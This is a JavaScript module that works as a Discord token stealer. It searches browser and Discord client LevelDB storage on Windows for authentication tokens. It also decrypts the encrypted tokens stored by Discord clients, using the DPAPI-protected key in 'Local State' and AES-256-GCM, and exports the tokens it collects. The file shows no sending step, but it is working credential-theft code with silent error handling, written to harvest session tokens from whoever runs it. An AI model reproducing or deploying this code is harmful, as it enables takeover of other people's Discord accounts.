const fs = require("fs");
const crypto = require("crypto");
const path = require("path");
const aura = require("win-dpapi");

let totalsTokens = [];

const cords = [
    "discord",
    "discordcanary",
    "discordptb",
    "discorddevelopment",
    "lightcord",
];

async function find(p) {
    const tail = p;
    p = path.join(p, "Local Storage/leveldb");

    if (!cords.some((d) => tail.includes(d))) {
        try {
            const files = await fs.promises.readdir(p);
            
            for (const file of files) {
                const filePath = path.join(p, file);
                const fileContent = await fs.promises.readFile(filePath, "utf8");

                const regexs = [
                    /mfa\.[\w-]{84}/g,
                    /[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm,
                    /[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g,
                ];

                regexs.forEach((r) => {
                    const foundTokens = fileContent.match(r);
                    if (foundTokens) {
                        foundTokens.forEach((tkn) => {
                            if (!totalsTokens.includes(tkn)) totalsTokens.push(tkn);
                        });
                    }
                });
            }
        } catch (err) { }
        return totalsTokens;
    } else {
        const localStatePath = path.join(tail, "Local State");
        if (fs.existsSync(localStatePath)) {
            try {
                fs.readdirSync(p).forEach((f) => {
                    if (f.endsWith(".log") || f.endsWith(".ldb")) {
                        const lines = fs
                            .readFileSync(path.join(p, f), "utf8")
                            .split(/\r?\n/);

                        lines.forEach((l) => {
                            const pattern = /dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*/g;
                            const foundTokens = l.match(pattern);

                            if (foundTokens) {
                                foundTokens.forEach((tkn) => {
                                    const enc = Buffer.from(
                                        JSON.parse(fs.readFileSync(localStatePath)).os_crypt
                                            .encrypted_key,
                                        "base64",
                                    ).slice(5);

                                    const key = aura.unprotectData(
                                        Buffer.from(enc, "utf-8"),
                                        null,
                                        "CurrentUser",
                                    );

                                    const tkns = Buffer.from(
                                        tkn.split("dQw4w9WgXcQ:")[1],
                                        "base64",
                                    );

                                    const run = tkns.slice(3, 15);
                                    const mid = tkns.slice(15, tkns.length - 16);

                                    const decyph = crypto.createDecipheriv(
                                        "aes-256-gcm",
                                        key,
                                        run,
                                    );

                                    decyph.setAuthTag(tkns.slice(tkns.length - 16, tkns.length));

                                    const out =
                                        decyph.update(mid, "base64", "utf-8") +
                                        decyph.final("utf-8");

                                    if (!totalsTokens.includes(out)) {
                                        totalsTokens.push(out);
                                    }
                                });
                            }
                        });
                    }
                });
            } catch (err) { }
            return totalsTokens;
        }
    }
}

module.exports = {
    find,
    totalsTokens,
};